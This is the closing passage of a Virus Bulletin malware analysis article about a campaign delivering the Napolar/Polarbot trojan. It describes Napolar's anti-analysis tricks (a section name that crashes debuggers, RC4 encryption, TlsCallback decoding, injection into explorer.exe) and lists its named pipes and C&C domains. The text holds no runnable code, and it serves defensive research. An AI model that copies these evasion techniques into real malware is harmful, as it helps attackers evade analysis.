</pre><p>Both files are decrypted using a custom decoder shellcode and then executed. The file f.txt decodes to the Napolar payload, and ns.txt decodes to a Rebhip (SpyRat) variant &ndash; a backdoor trojan written in Delphi. </p><p>The project path stored in the sample is exactly the same as in the previous sample: C:\Users\<span class="emphasis"><em>Johntab</em></span>\AppData\Local\Temp\, indicating that it comes from the same author as the previous one. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3299111"></a>Payload: Napolar</h2></div></div></div><p>In all cases, the final payload of the infection campaign was a Napolar/Polarbot variant, as described in detail in [<span class="citation"><a href="#citation.1">1</a></span>]. Since the scope of this article is the distribution and installation of the malware, rather than the final payload, I will not describe Napolar in detail, only point out a few interesting things about it. </p><p>The executable features a couple of advanced anti-analysis tricks: </p><p>It has only one PE section, named &lsquo;%*s%*s%s&rsquo;. This crashes analysis tools, such as <span class="emphasis"><em>studPe</em></span> and <span class="emphasis"><em>OllyDbg</em></span> (using the format string vulnerability documented in [<span class="citation"><a href="#citation.9">9</a></span>]). </p><p>The executable is further obfuscated &ndash; the code section is encrypted, with the entry point set to an invalid value (0). </p><div class="figure"><a id="figure.12"></a><div class="mediaobject"><img alt="Napolar anti-reversing trick: spooky section name and 0 entry point." src="/uploads/images/figures/2014/04/Napolar-12.jpg" /></div><p class="title"><b>Figure&nbsp;12.&nbsp;Napolar anti-reversing trick: spooky section name and 0 entry point.</b></p></div><p>The decoding and execution is achieved via two predefined TlsCallback functions. This makes it possible for Napolar to decrypt itself and execute even if no valid entry point is set &ndash; as described in [<span class="citation"><a href="#citation.1">1</a></span>]. </p><p>The encryption algorithm is RC4, the key is 0xDEADBEEF. The decryption code is address independent, with an unusual load address (0xFE0000), as shown in <a href="#figure.13">Figure 13</a>. </p><div class="figure"><a id="figure.13"></a><div class="mediaobject"><img alt="Address-independent RCA decoder in TlsCallback." src="/uploads/images/figures/2014/04/Napolar-13.jpg" /></div><p class="title"><b>Figure&nbsp;13.&nbsp;Address-independent RCA decoder in TlsCallback.</b></p></div><p>(Click <a href="/uploads/images/figures/2014/04/Napolar-13-large.jpg" target="_top">here</a> to view a larger version of Figure 13.)</p><p>The decoded content is injected into the explorer.exe process, which causes an additional obstacle in the debugging process: once the injection is complete, debugging to the explorer process may cause the computer to crash. </p><p>The trojan uses named pipes for inter-process communication. In the samples we have identified as belonging to this campaign, the names were a little (but only a little) different from the commonly reported \\.\pipe\napSolar: </p><div class="itemizedlist"><ul type="disc"><li><p>\\.pipe\npSolar</p></li><li><p>\\.pipe\napSolar</p></li></ul></div><p>The following C&amp;C servers were contacted by the samples in this campaign:</p><div class="itemizedlist"><ul type="disc"><li><p>dopline.ru</p></li><li><p>terra-araucania.cl</p></li><li><p>kasvatus.org.</p></li></ul></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4037614"></a>Conclusion</h2></div></div></div><p>This infection campaign reminds us once again that social engineering can be as effective as any code based exploitation. After all, exploitable versions of an application can be found with a lot less probability than socially engineerable users &ndash; the latter being installed in front of 90+% of computers. </p><p>Malware authors continue to surprise me over and over again. This time they surprised me not with the technical depth this piece of malware reached (average tasks accomplished), or its originality (proof of concept codes pasted in from multiple sources), but with the unusual selection of tools used. A VBA macro injects and runs a shellcode, then later on an AutoIt script injects and executes a shellcode. These are the two programming languages least likely to be named in the same paragraph as the word &lsquo;shellcodes&rsquo;. </p><p>I await the next move with anticipation &ndash; which, logically, can&rsquo;t be anything other than the deployment of QuickBasic in targeted attacks. </p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3755417"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] Xu, H. Solarbot botnet. Virus Bulletin, March 2014, p.12. <span class="bibliosource"><a href="/virusbulletin/2014/03/solarbot-botnet
" target="_top">http://www.virusbtn.com/virusbulletin/archive/2014/03/vb201403-Solarbot</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] Szappanos, G. Advanced Persistent Threats &ndash; the new normal? Naked Security. <span class="bibliosource"><a href="https://nakedsecurity.sophos.com/advanced-persistent-threats-the-new-normal/" target="_blank">http://nakedsecurity.sophos.com/advanced-persistent-threats-the-new-normal/</a></span>. </p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] Weeks, M. Direct shellcode execution in MS Office macros. <span class="bibliosource"><a href="https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/" target="_blank">http://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/</a></span>.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] Stevens, D. Excel Exercises in Style. <span class="bibliosource"><a href="https://blog.didierstevens.com/2008/10/23/excel-exercises-in-style/" target="_blank">http://blog.didierstevens.com/2008/10/23/excel-exercises-in-style/</a></span>. </p></div><div class="bibliomixed"><a id="citation.5"></a><p class="bibliomixed">[5] <span class="bibliosource"><a href="http://foro.udtools.net/archive/index.php/t-10570.html" target="_blank">http://foro.udtools.net/archive/index.php/t-10570.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.6"></a><p class="bibliomixed">[6] AutoIt3Wrapper. <span class="bibliosource"><a href="https://www.autoitscript.com/autoit3/scite/docs/AutoIt3Wrapper.html" target="_blank">http://www.autoitscript.com/autoit3/scite/docs/AutoIt3Wrapper.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.7"></a><p class="bibliomixed">[7] Metasploit. <span class="bibliosource"><a href="https://www.youtube.com/watch?v=BAcQ7PR4FUw" target="_blank">https://www.youtube.com/watch?v=BAcQ7PR4FUw</a></span>.</p></div><div class="bibliomixed"><a id="citation.8"></a><p class="bibliomixed">[8] boot.sx (Betabot http botnet hosted by worldstream.nl). <span class="bibliosource"><a href="http://www.exposedbotnets.com/2013/12/bootsx-betabot-http-botnet-hosted-by.html" target="_blank">http://www.exposedbotnets.com/2013/12/bootsx-betabot-http-botnet-hosted-by.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.9"></a><p class="bibliomixed">[9] OllyDbg Section Name Crash. <span class="bibliosource"><a href="https://forum.tuts4you.com/topic/28650-ollydbg-section-name-crash/" target="_blank">http://forum.tuts4you.com/topic/28650-ollydbg-section-name-crash/</a></span>. </p></div></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=Back to VBA&url=https://www.virusbulletin.com/virusbulletin/2014/04/back-vba"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2014/04/back-vba'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2014/04/back-vba&title=Back to VBA"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2014/04/back-vba&t=Back to VBA"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2014/04/back-vba"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>